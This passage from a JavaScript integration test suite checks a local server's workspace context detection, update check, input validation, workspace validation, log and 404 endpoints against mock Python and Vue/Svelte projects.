    writeFileSync(join(pythonWs, "pyproject.toml"), "[tool.poetry]\nname = 'ai-service'\ndependencies = { fastapi = '^0.110.0', langchain = '^0.1.0' }");
    writeFileSync(join(pythonWs, "requirements.txt"), "torch\npytest\nflask");
    writeFileSync(join(pythonWs, "docker-compose.yml"), "version: '3'\nservices:\n  app:\n    build: .");

    const pyCtx = await (await fetch(`${baseUrl}/context?cwd=${encodeURIComponent(pythonWs)}`)).json();
    assert.strictEqual(pyCtx.ok, true);
    assert.ok(pyCtx.languages.includes("python"));
    assert.ok(pyCtx.frameworks.includes("fastapi") || pyCtx.frameworks.includes("docker"));
    assert.ok(pyCtx.bundles.length >= 1);

    // 12. Context analysis with Frontend Vue/Svelte/Tailwind workspace
    const frontWs = join(testTmpDir, "mock-frontend-stack");
    mkdirSync(frontWs, { recursive: true });
    writeFileSync(join(frontWs, "package.json"), JSON.stringify({
      name: "vue-app",
      dependencies: { vue: "^3.4.0", tailwindcss: "^3.4.0", svelte: "^4.0.0" }
    }));
    const frontCtx = await (await fetch(`${baseUrl}/context?cwd=${encodeURIComponent(frontWs)}`)).json();
    assert.strictEqual(frontCtx.ok, true);
    assert.ok(frontCtx.frameworks.includes("vue") || frontCtx.frameworks.includes("tailwind"));

    // 13. Update check
    const updCheck = await (await fetch(`${baseUrl}/update/check`)).json();
    assert.strictEqual(typeof updCheck.hasUpdate, "boolean");

    // 14. Input validation for install and uninstall
    const instBad = await fetch(`${baseUrl}/install`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.strictEqual(instBad.status, 400);

    const uninstBad = await fetch(`${baseUrl}/uninstall`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.strictEqual(uninstBad.status, 400);

    // 15. Validation on mark / forget with missing params
    const markBad = await fetch(`${baseUrl}/mark`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    assert.strictEqual(markBad.status, 400);

    const forgetBad = await fetch(`${baseUrl}/forget/invalid_type/invalid_id`, { method: "DELETE" });
    assert.strictEqual(forgetBad.status, 400);

    // 16. Workspaces validate endpoint
    const valGood = await (await fetch(`${baseUrl}/workspaces/validate`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: mockWs }),
    })).json();
    assert.strictEqual(valGood.ok, true);
    assert.strictEqual(valGood.exists, true);
    assert.strictEqual(valGood.isGit, true);

    const valBad = await fetch(`${baseUrl}/workspaces/validate`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ path: join(testTmpDir, "nonexistent-dir-99") }),
    });
    assert.strictEqual(valBad.status, 404);

    // 17. Server logs endpoint
    const logsRes = await (await fetch(`${baseUrl}/logs?limit=50`)).json();
    assert.strictEqual(logsRes.ok, true);
    assert.ok(Array.isArray(logsRes.logs));

    // 18. 404 handler
    const notFound = await fetch(`${baseUrl}/nonexistent-xyz-404`);
    assert.strictEqual(notFound.status, 404);
  } finally {
    await new Promise((r) => server.close(r));
  }
});
